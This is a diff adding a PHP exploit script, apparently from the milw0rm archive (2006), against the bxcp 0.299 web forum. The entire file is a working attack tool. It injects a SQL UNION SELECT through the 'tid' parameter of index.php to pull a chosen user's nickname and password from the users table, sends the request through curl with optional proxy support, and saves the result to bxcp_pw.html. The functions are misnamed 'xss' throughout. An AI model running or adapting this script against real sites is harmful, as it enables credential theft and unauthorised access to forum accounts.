@@ -1,0 +1,69 @@
+<?
+error_reporting(E_ERROR);
+
+function xss_init()
+{
+    if (!extension_loaded('php_curl'))
+    {
+       if (!dl('curl.so') and !dl('php_curl.so') and !dl('php_curl.dll'))
+       die ("oo error - cannot load curl extension!");
+    }
+}
+
+function xss_header()
+{
+    echo "\noooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo\n";
+    echo "                                  oo    ooooooo     ooooooo\n";
+    echo "                    oooo   oooo o888  o88     888 o888   888o\n";
+    echo "                      888o888    888        o888   888888888\n";
+    echo "                      o88888o    888     o888   o 888o   o888\n";
+    echo "                    o88o   o88o o888o o8888oooo88   88ooo88\n";
+    echo "oooooooooooooooooooooooooooooo bxcp 0.299 exploit oooooooooooooooooooooooooooooo\n";
+    echo "oo usage          $ php bxcp-0299-exploit.php [url] [user id]\n";
+    echo "oo proxy support  $ php bxcp-0299-exploit.php [url] [user id] [proxy]:[port]\n";
+    echo "oo example        $ php bxcp-0299-exploit.php http://localhost 1\n";
+    echo "oo open the file bxcp_pw.html - there you find the password of the user\n\n";
+}
+
+function xss_bottom()
+{
+    echo "\noo discover : x128 - alexander wilhelm - 19/02/2006\n";
+    echo "oo contact  : exploit <at> x128.net                    oo website : www.x128.net";
+}
+
+function xss_exploit()
+{
+    $xss_target = $_SERVER['argv'][1] . "/index.php";
+    $xss_http_get = "?show=topic&tid=" . urlencode("0 UNION SELECT 1, 1, 1, nick, 1, 1, 1, `password`, 1, 1, 1, 1, 1, 1, 1 FROM users WHERE id = ". $_SERVER['argv'][2] ."/*");
+
+    $xss_connection = curl_init();
+
+    if ($_SERVER['argv'][3])
+    {
+        curl_setopt($xss_connection, CURLOPT_TIMEOUT, 8);
+        curl_setopt($xss_connection, CURLOPT_PROXY, $_SERVER['argv'][3]);
+    }
+
+    curl_setopt ($xss_connection, CURLOPT_URL, $xss_target . $xss_http_get);
+    curl_setopt ($xss_connection, CURLOPT_HEADER, 0);
+    curl_setopt ($xss_connection, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt ($xss_connection, CURLOPT_USERAGENT, 'x128');
+
+    $xss_source = curl_exec($xss_connection) or die("oo error - cannot connect!");
+
+    if ($xss_source) echo "oo dafaced ...\n";
+
+    $xss_output = fopen("bxcp_pw.html","w");
+    fputs($xss_output, $xss_source);
+    fclose($xss_output);
+
+    curl_close ($xss_connection); 
+}
+
+xss_init();
+xss_header();
+xss_exploit();
+xss_bottom();
+?>
+
+# milw0rm.com [2006-02-19]
